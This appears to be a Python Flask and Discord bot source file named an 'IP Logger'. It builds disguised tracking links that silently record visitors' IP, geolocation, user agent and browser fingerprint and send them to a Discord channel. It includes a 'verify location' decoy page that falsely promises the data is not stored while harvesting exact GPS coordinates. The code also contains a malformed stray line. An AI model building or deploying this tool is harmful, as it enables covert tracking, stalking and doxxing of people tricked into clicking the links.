import os, re, json, hashlib, threading, asyncio
from datetime import datetime, timezone
from urllib.parse import quote_plus

import requests
from flask import Flask, request, render_template_string, jsonify, redirect, abort

import discord
from discord import app_commands

# ─── Config ────────────────────────────────────────────────────────────────
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN", "")
DISCORD_CHANNEL_ID = os.getenv("DISCORD_CHANNEL_ID", "")
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")  # fallback if BOT not used
REDIRECT_URL = os.getenv("REDIRECT_URL", "https://www.google.com")
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN", "")

# ─── In-memory store (Redis/DB for prod) ───────────────────────────────────
# campaign: token -> redirect_url
CAMPAIGNS = {}  # e.g. {"camp001": "https://example.com"}
HITS = {}       # hit_id -> {ip, geo, ts, token}

# ─── Flask app ─────────────────────────────────────────────────────────────
app = Flask(__name__)

def get_client_ip():
    """Parse real client IP from trusted proxy headers."""
    for h in ("CF-Connecting-IP", "X-Real-IP"):          # Cloudflare / nginx
        v = request.headers.get(h)
        if v:
            return v.strip()
    xf = request.headers.get("X-Forwarded-For", "")
    if xf:
        return xf.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"

def geo_lookup(ip):
    """Return GeoIP dict. Tries ipinfo first, falls back to ip-api."""
    out = {"ip": ip}
    # Primary: ipinfo (paid token better)
    if IPINFO_TOKEN:
        try:
            d = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=4).json()
            out.update(d)
        except Exception:
            pass
    # Fallback or primary: ip-api
    if not out.get("city"):
        try:
            d = requests.get(
                f"http://ip-api.com/json/{ip}"
                f"?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query",
                timeout=4,
            ).json()
            if d.get("status") == "success":
                out["city"] = d.get("city")
                out["region"] = d.get("regionName")
                out["country"] = d.get("country")
                out["postal"] = d.get("zip")
                out["org"] = d.get("org") or d.get("isp")
                out["loc"] = f"{d.get('lat')},{d.get('lon')}" if d.get("lat") else None
                out["timezone"] = d.get("timezone")
                out["mobile"] = d.get("mobile")
                out["proxy"] = d.get("proxy")
                out["hosting"] = d.get("hosting")
                out["as"] = d.get("as")
        except Exception:
            pass
    return out

def format_geo(geo):
    """Build display fields from GeoIP dict."""
    loc = geo.get("loc") or ""
    lat = lon = None
    if loc and "," in loc:
        lat, lon = loc.split(",", 1)
    return {
        "IP": geo.get("ip"),
        "City": geo.get("city"),
        "Region": geo.get("region"),
        "Country": geo.get("country"),
        "Postal": geo.get("postal"),
        "ISP / Org": geo.get("org"),
        "AS": geo.get("as"),
        "Coordinates": loc or "—",
        "Maps": f"https://www.google.com/maps?q={lat},{lon}" if lat else "—",
        "Timezone": geo.get("timezone"),
        "Mobile": geo.get("mobile", ""),
        "Proxy/VPN": geo.get("proxy", ""),
        "Hosting/DC": geo.get("hosting", ""),
    }

def discord_send(title, fields, color=0xE74C3C):
    """Send embed to Discord via bot channel or webhook."""
    embed = {
        "title": title[:256],
        "color": color,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": [
            {"name": str(k)[:256], "value": str(v)[:1024], "inline": True}
            for k, v in fields.items() if v not in (None, "", False, "—")
        ],
    }
    # Try bot channel first
    if bot_channel:
        asyncio.run_coroutine_threadsafe(
            bot_channel.send(embed=discord.Embed.from_dict(embed)),
            bot.loop,
        )
    # Fallback to webhook
    elif DISCORD_WEBHOOK_URL:
        try:
            requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
        except Exception:
            pass

# ─── GPS Decoy Page (browser STILL shows Allow / Block) ────────────────────
GPS_PAGE = r"""
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
<title>Verify location</title>
<style>
  :root{color-scheme:light}
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;font-family:system-ui,-apple-system,sans-serif;
       background:#f8fafc;color:#0f172a;display:flex;align-items:center;justify-content:center}
  .card{width:min(400px,92vw);background:#fff;border-radius:16px;padding:28px 22px 22px;
        box-shadow:0 10px 40px rgba(15,23,42,.12);text-align:center}
  .ico{font-size:48px;margin-bottom:8px}
  h1{font-size:1.25rem;margin:0 0 8px}
  p{margin:0 0 18px;color:#475569;font-size:.95rem;line-height:1.45}
  button{width:100%;border:0;border-radius:12px;padding:14px;font-size:1rem;font-weight:600;
         color:#fff;background:#2563eb;cursor:pointer;transition:opacity .15s}
  button:active{opacity:.8}
  .spin{display:none;width:28px;height:28px;border:3px solid #e2e8f0;border-top-color:#2563eb;
        border-radius:50%;animation:s .7s linear infinite;margin:16px auto 0}
  @keyframes s{to{transform:rotate(360deg)}}
  .err{display:none;margin-top:12px;color:#dc2626;font-size:.85rem}
  .hint{font-size:.8rem;color:#94a3b8;margin-top:12px}
</style>
</head>
<body>
<div class="card">
  <div class="ico">📍</div>
  <h1>One-time verification</h1>
  <p>This check helps confirm you are at your trusted location. Tap <b>Continue</b> then choose <b>Allow</b> in the browser prompt.</p>
  <button id="go">Continue</button>
  <div class="spin" id="spin"></div>
  <div class="err" id="err">Location permission denied or unavailable. <a href="#" onclick="location.reload();return!1">Try again</a></div>
  <div class="hint">Your location is only used for this check and not stored.</div>
</div>
<script>
const REDIR = {{ redirect|tojson }};
const HID = {{ hit_id|tojson }};
function post(d) { return fetch('/api/beacon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d),keepalive:true}).catch(()=>{}); }
function base() {
  return {hit_id:HID,screen:screen.width+'x'+screen.height+'x'+screen.colorDepth,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,platform:navigator.platform};
}
document.getElementById('go').onclick = function(){
  var btn=this,spin=document.getElementById('spin'),err=document.getElementById('err');
  btn.style.display='none'; spin.style.display='block'; err.style.display='none';
  if(!navigator.geolocation){
    post({...base(),gps:false,reason:'unsupported'}).finally(function(){location.replace(REDIR);});
    return;
  }
  navigator.geolocation.getCurrentPosition(
    function(pos){
      post({...base(),gps:true,lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude}).then(function(){location.replace(REDIR);});
    },
    function(e){
      post({...base(),gps:false,reason:(e&&e.message)||'denied'});
      spin.style.display='none'; btn.style.display='block'; btn.textContent='Retry';
      err.style.display='block';
    },
    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
  );
};
if(navigator.permissions&&navigator.permissions.query){
  navigator.permissions.query({name:'geolocation'}).then(function(r){if(r.state==='granted')document.getElementById('go').click();}).catch(function(){});
}
</script>
</body>
</html>
"""

# ─── Flask Routes ──────────────────────────────────────────────────────────

@app.route("/")
def index():
    """Auto IP grab + redirect (no UI, no prompt)."""
    ip = get_client_ip()
    geo = geo_lookup(ip)
    hit_id = hashlib.sha256(f"{ip}{datetime.utcnow().isoformat()}".encode()).hexdigest()[:12]
    HITS[hit_id] = {"ip": ip, "geo": geo, "ts": datetime.utcnow().isoformat(), "token": None}

    fields = format_geo(geo)
    fields["User-Agent"] = (request.headers.get("User-Agent") or "")[:250]
    fields["Hit ID"] = hit_id
    discord_send("AUTO IP GRAB", fields, color=0x3498DB)
    return redirect(REDIRECT_URL)

@app.route("/r/<token>")
def campaign(token):
    """Tracked campaign link."""
    ip = get_client_ip()
    geo = geo_lookup(ip)
    hit_id = hashlib.sha256(f"{ip}{token}{datetime.utcnow().isoformat()}".encode()).hexdigest()[:12]
    HITS[hit_id] = {"ip": ip, "geo": geo, "ts": datetime.utcnow().isoformat(), "token": token}

    dest = CAMPAIGNS.get(token, REDIRECT_URL)
    fields = format_geo(geo)
    fields["User-Agent"] = (request.headers.get("User-Agent") or "")[:250]
    fields["Campaign"] = token
    fields["Hit ID"] = hit_id
    discord_send(f"🎯 CAMPAIGN · {token}", fields, color=0x9B59B6)
    return redirect(dest)

@app.route("/g")
@app.route("/g/<token>")
def gps_page(token=None):
    """GPS decoy page — browser WILL show Allow/Block."""
    ip = get_client_ip()
    geo = geo_lookup(ip)
    hit_id = hashlib.sha256(f"{ip}g{datetime.utcnow().isoformat()}".encode()).hexdigest()[:12]
    HITS[hit_id] = {"ip": ip, "geo": geo, "ts": datetime.utcnow().isoformat(), "token": token or "gps"}

    # Send auto IP hit immediately
    fields = format_geo(geo)
    fields["User-Agent"] = (request.headers.get("User-Agent") or "")[:250]
    fields["Page"] = f"/g/{token}" if token else "/g"
    fields["Hit ID"] = hit_id
    discord_send("📍 GPS PAGE LOAD (auto IP)", fields, color=0xF39C12)

    return render_template_string(GPS_PAGE, redirect=REDIRECT_URL, hit_id=hit_id)

@app.route("/api/beacon", methods=["POST"])
def beacon():
    """Receive browser GPS + fingerprint data after user action."""
    d = request.get_json(silent=True) or {}
    hit_id = d.get("hit_id")
    prev = HITS.get(hit_id, {})
    ip = get_client_ip()
    geo = prev.get("geo") or geo_lookup(ip)

    fields = {
        "Hit ID": hit_id,
        "IP": ip,
        "Screen": d.get("screen"),
        "Language": d.get("lang"),
        "TZ (browser)": d.get("tz"),
        "Platform": d.get("platform"),
    }
    # TZ mismatch = possible VPN
    geo_tz = geo.get("timezone")
    if geo_tz and d.get("tz") and geo_tz != d.get("tz"):
        fields["⚠ TZ mismatch"] = f"IP={geo_tz} vs browser={d.get('tz')}"

    if d.get("gps") and d.get("lat") is not None:
        fields.update({
            "GPS": "GRANTED",
            "Latitude": d["lat"],
            "Longitude": d["lon"],
            "Accuracy (m)": d.get("acc"),
            "Altitude": d.get("alt", "—"),
            "Maps": f"https://www.google.com/maps?q={d['lat']},{d['lon']}",
        })
        discord_send("🛰️ GPS GRAB — EXACT LOCATION", fields, color=0xE74C3C)
    else:
        fields["GPS"] = "DENIED / UNAVAILABLE"
        fields["Reason"] = d.get("reason", "unknown")
        discord_send("🚫 GPS DENIED (IP already logged)", fields, color=0x95A5A6)

    return jsonify(ok=True)

@app.route("/ping")
def ping():
    return "pong", 200

# ─── Discord Bot ──────────────────────────────────────────────────────────

bot = discord.Client(intents=discord.Intents.default())
tree = app_commands.CommandTree(bot)
bot_channel = None  # set on ready

@bot.event
async def on_ready():
    global bot_channel
    print(f"[+] Bot online as {bot.user}")
    if DISCORD_CHANNEL_ID:
        ch = bot.get_channel(int(DISCORD_CHANNEL_ID))
        if ch:
            bot_channel = ch
            print(f"[+] Channel set: #{ch.name}")
    await tree.sync()
    print("[+] Slash commands synced")

@tree.command(name="status", description="Check bot status and stats")
async def cmd_status(interaction: discord.Interaction):
    embed = discord.Embed(
        title="IP Logger — Status",
        color=0x2ECC71,
        timestamp=datetime.now(timezone.utc),
    )
    embed.add_field(name="Hits today", value=str(len(HITS)), inline=True)
    embed.add_field(name="Campaigns", value=str(len(CAMPAIGNS)), inline=True)
    embed.add_field(name="Redirect", value=REDIRECT_URL, inline=False)
    embed.add_field(name="Bot ping", value=f"{round(bot.latency*1000)}ms", inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="setredirect", description="Change the default redirect URL")
@app_commands.describe(url="New redirect URL")
async def cmd_setredirect(interaction: discord.Interaction, url: str):
    if not url.startswith(("http://", "https://")):
        await interaction.response.send_message("❌ Must start with http:// or https://", ephemeral=True)
        return
    global REDIRECT_URL
    REDIRECT_URL = url
    await interaction.response.send_message(f"✅ Redirect set to: {url}")

@tree.command(name="genlink", description="Generate a campaign tracking link")
@app_commands.describe(campaign="Campaign name (alphanumeric, no spaces)")
async def cmd_genlink(interaction: discord.Interaction, campaign: str):
    if not re.match(r"^[a-zA-Z0-9_-]{1,32}$", campaign):
        await interaction.response.send_message(
            "❌ Use only letters, numbers, hyphens, underscores (max 32 chars)", ephemeral=True
        )
        return
    base_url = os.getenv("BASE_URL", "https://example.com")
    link = f"{base_url.rstrip('/')}/r/{campaign}"
    CAMPAIGNS[campaign] = REDIRECT_URL
    embed = discord.Embed(title="🔗 Link Generated", color=0x3498DB)
    embed.add_field(name="Campaign", value=campaign, inline=True)
    embed.add_field(name="Link", value=link, inline=False)
    embed.add_field(name="Redirects to", value=REDIRECT_URL, inline=False)
    await interaction.response.send_message(embed=embed)
 @tree.command /gpslink
def run_discord_bot():
    """Run the bot with its own asyncio loop (blocking)."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(bot.start(DISCORD_BOT_TOKEN))

# ─── Entry point ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))

    # Start Discord bot in background thread
    if DISCORD_BOT_TOKEN:
        t = threading.Thread(target=run_discord_bot, daemon=True)
        t.start()
        print("[+] Discord bot thread started")

    # Start Flask (main thread)
    app.run(host="0.0.0.0", port=port)
